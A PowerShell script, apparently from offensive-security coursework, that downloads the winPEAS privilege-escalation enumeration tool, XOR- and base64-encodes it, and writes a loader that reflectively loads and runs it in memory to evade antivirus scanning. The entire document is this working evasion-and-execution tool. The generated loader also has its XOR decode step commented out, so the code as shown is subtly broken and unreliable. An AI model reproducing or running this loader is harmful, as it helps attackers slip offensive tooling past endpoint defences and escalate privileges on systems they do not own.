Set-ExecutionPolicy -Scope "CurrentUser" -ExecutionPolicy "RemoteSigned"
$url = "https://github.com/carlospolop/PEASS-ng/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
$file = "Z:\var\www\html\osep\tools\winPEASany.exe"
$outfile = "Z:\var\www\html\osep\tools\winPEAS.ps1"

Invoke-WebRequest -Uri $url -OutFile $file

$bytes = [IO.File]::ReadAllBytes($file)
$key = 0x7
for($i=0; $i -lt $bytes.count ; $i++)
{
    $bytes[$i] = $bytes[$i] -bxor $key
}
$encoded = [Convert]::ToBase64String($bytes)

$content = '$thecontent = "' + $encoded + '"' + "`r`n"
$content = $content + '$bytes = [Convert]::FromBase64String($thecontent)' + "`r`n"
$content = $content + '#$key = 0x7' + "`r`n"
$content = $content + '#for($i=0; $i -lt $bytes.count ; $i++)' + "`r`n"
$content = $content + '#{' + "`r`n"
$content = $content + '#    $bytes[$i] = $bytes[$i] -bxor $key' + "`r`n"
$content = $content + '#}' + "`r`n"
$content = $content + '$wp = [System.Reflection.Assembly]::Load($bytes)' + "`r`n"
$content = $content + '[winPEAS.Program]::Main("")' + "`r`n"

Set-Content -Path $outfile -Value $content